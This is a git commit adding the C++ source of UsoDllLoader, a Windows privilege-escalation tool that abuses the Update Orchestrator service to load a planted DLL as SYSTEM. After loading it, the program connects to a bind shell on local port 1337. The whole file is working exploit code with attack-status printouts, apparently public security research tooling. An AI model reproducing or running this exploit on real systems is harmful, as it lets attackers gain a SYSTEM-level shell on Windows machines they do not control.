9dd9879d9c0dc64b3d6736ddb64c29cd49e88caf
itm4n <itm4n@gmx.com>
2019-08-01 20:17:57 +0200

    Initial commit

---
+++ UsoDllLoader/UsoDllLoader.cpp
@@ -0,0 +1,34 @@
+
+#include <iostream>
+
+#include "MiniUsoClient.h"
+#include "TcpClient.h"
+
+
+int wmain(int argc, wchar_t** argv)
+{
+
+	// ========================================================================
+	// Use UpdateOrchestrator to load the DLL 
+	// ========================================================================
+	wprintf_s(L"[*] Using UpdateOrchestrator to load the DLL as SYSTEM...\n");
+	MiniUsoClient miniUsoClient;
+	if (!miniUsoClient.StartScan())
+	{
+		return 1;
+	}
+	
+	// Wait a bit before trying to connect to the bind shell.
+	// We might need this if the machine slow. 
+	wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");
+	Sleep(2000);
+
+	// ========================================================================
+	// Try to connect to bindshell 
+	// ========================================================================
+	wprintf_s(L"[*] Spawning shell...\n");
+	TcpClient tcpClient;
+	tcpClient.connectTCP("127.0.0.1", "1337");
+
+	return 0;
+}
